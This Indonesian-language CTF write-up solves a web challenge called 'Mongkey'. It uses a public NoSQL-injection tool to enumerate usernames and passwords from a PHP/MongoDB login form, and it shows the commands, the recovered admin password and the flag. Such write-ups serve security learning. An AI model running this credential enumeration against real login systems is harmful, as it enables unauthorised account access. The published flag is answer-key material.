# Mongkey
## About The Challenge

![Screenshot from 2023-06-13 23-29-18](https://github.com/yogasungkowo/CTF-WRITEUP/assets/93362737/3e7357c6-7216-4156-8aeb-82cbe8408d6e)

Diberikan sebuah website http://103.167.136.89:10002/ dengan tampilan :
![Screenshot from 2023-06-13 23-32-03](https://github.com/yogasungkowo/CTF-WRITEUP/assets/93362737/a9bd5a88-8c40-4c30-a4a3-b1c17b0af079)

# Solutions

Dalam challenge kita diharuskan login sebagai admin untuk mendapati flagnya
Dalam challenge juga saya mendapati petunjuk yaitu "Do you know if it is possible to post an array in PHP? I use MongoDB btw"
saya berpikir bahwa ini merupakan sejenis SQL Injection namun dalam bentu mongodb saya berpikir menggunakan tool NosQLI MongoDB injection
menggunakan tool yang saya dapatkan dari [sini](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration/tree/master)
setelah mendapatkan file toolnya menggunakan git clone

saya memasukkan perintah, untuk mencari username yang terdapat didalam website :
```shell
python3 nosqli-user-pass-enum.py -u http://103.167.136.89:10002/ -up username -pp password -ep username -op login:login
```
saya mendapati bahwa username didalam website ini ada dua yaitu :
```shell
2 username(s) found:
admin
guest
```
![Screenshot from 2023-06-14 00-05-58](https://github.com/yogasungkowo/CTF-WRITEUP/assets/93362737/fa9c6d5e-1656-4975-bdcb-0ec26da559a3)

guest bukanlah username untuk medapatkan flagnya maka saya berasumsi bahwa flag terdapat pada user 'admin', mari kita cari passwordnya dengan perintah :
```shell
python3 nosqli-user-pass-enum.py -u http://103.167.136.89:10002/ -up username -pp password -ep password -op login:login
```
setelah tool selesai melakukan tugasnya maka mendapati hasil
```shell
2 password(s) found:
guest
ForestyHC{reject_humanity_return_to_monke_5543d8}
```
![Screenshot from 2023-06-14 00-06-26](https://github.com/yogasungkowo/CTF-WRITEUP/assets/93362737/b5f1edc7-4fb2-4a8e-9968-0823d5b7b5c3)

wow ternyata password untuk user admin adalah flag yang kita cari cari

## Flag
**ForestyHC{reject_humanity_return_to_monke_5543d8}**
